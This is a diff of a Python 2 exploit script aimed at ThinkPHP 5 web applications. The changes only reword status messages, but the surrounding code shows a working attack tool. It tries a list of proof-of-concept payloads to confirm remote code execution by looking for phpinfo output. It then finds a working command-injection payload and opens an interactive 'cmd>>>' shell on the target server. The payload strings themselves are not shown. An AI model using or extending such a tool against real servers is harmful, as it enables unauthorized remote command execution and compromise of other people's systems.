@@ -58,29 +58,29 @@ def tp5_getshell_check(tgtUrl,timeout):
 		try:
 			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
 		except requests.exceptions.Timeout:
-			print 'Getshell checked fail! Error: Timeout'
+			print 'phpinfo checked fail! Error: Timeout'
 			continue
 		except requests.exceptions.ConnectionError:
-			print 'Getshell checked fail! Error: ConnectionError'
+			print 'phpinfo checked fail! Error: ConnectionError'
 			continue
 		except:
-			print 'Getshell checked fail! Error: Unkonwn error0'
+			print 'phpinfo checked fail! Error: Unkonwn error0'
 			continue
 		
 		if rst.status_code == 200:
 			
 			if(rst.text.index('PHP Version')):
-				print 'Getshell checked success! poc'  + str(p) + ': ' + poclist[p] + '\n'
+				print 'phpinfo checked success! poc'  + str(p) + ': ' + poclist[p] + '\n'
 
 			else:
 				soup = BeautifulSoup(rst.text,'lxml')
 				if(soup.find('title')):
-					print 'Poc' + str(p) + ' getshell checked fail! Error title: ' + str(soup.title.string) + '\n'
+					print 'Poc' + str(p) + ' phpinfo checked fail! Error title: ' + str(soup.title.string) + '\n'
 				else:
-					print 'Poc' + str(p) + ' getshell checked fail! ' + str(rst.text[0:11]) + '\n'
+					print 'Poc' + str(p) + ' phpinfo checked fail! ' + str(rst.text[0:11]) + '\n'
 	
 		else:
-			print 'Poc' + str(p) + ' getshell checked fail! status code: ' + str(rst.status_code) + '\n'
+			print 'Poc' + str(p) + ' phpinfo checked fail! status code: ' + str(rst.status_code) + '\n'
 			continue
 	
 def tp5_getshell_cmdshell(tgtUrl,timeout):
@@ -93,7 +93,7 @@ def tp5_getshell_cmdshell(tgtUrl,timeout):
 			
 			if rst.status_code == 200:
 				if 'zxc000' in rst.text:
-					print 'Getshell cmd success! now use poc'  + str(c) + ': ' + cmdlist[c] + '\n'
+					print 'Getshell cmd success! now use cmdexp'  + str(c) + ': ' + cmdlist[c] + '\n'
 					while True:
 						command = raw_input("cmd>>> ")
 						if command == 'exit':
@@ -106,7 +106,7 @@ def tp5_getshell_cmdshell(tgtUrl,timeout):
 					break
 				
 				else:
-					print 'Cmdshell' + str(c) + ' getshell checked fail! status code: ' + str(rst.status_code) + '\n'
+					print 'Cmdshell' + str(c) + ' checked fail! status code: ' + str(rst.status_code) + '\n'
 					continue
 				
 			
